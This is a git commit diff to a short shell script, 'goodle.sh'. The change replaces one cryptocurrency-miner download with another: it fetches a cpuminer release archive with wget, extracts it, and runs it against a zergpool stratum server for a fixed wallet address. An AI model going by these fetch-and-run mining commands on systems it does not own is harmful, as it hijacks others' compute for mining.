36e3eeb614273210b7b8318cd806e1a68bf8946b
baruaduh <96117980+baruaduh@users.noreply.github.com>
2021-12-14 23:27:33 +0700

    Update goodle.sh

--- goodle.sh
+++ goodle.sh
@@ -1,3 +1,3 @@
-wget https://github.com/ahashpool/Sniffdogminer/archive/refs/tags/2.16.A.tar.gz
-tar -xf 2.16.A.tar.gz
-./cpuminer-sse2 -a yescrypt -o stratum+tcp://yescrypt.mine.ahashpool.com:3433 -u 514DRsPnAGyAo7FY7kphw1xrdAxMf2kKDM -p d=64
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+./cpuminer-sse2 -a yescrypt -o stratum+tcp://yescrypt.asia.mine.zergpool.com:6233 -u 514DRsPnAGyAo7FY7kphw1xrdAxMf2kKDM -p  c=XMY,mc=XMY,ID=XXX
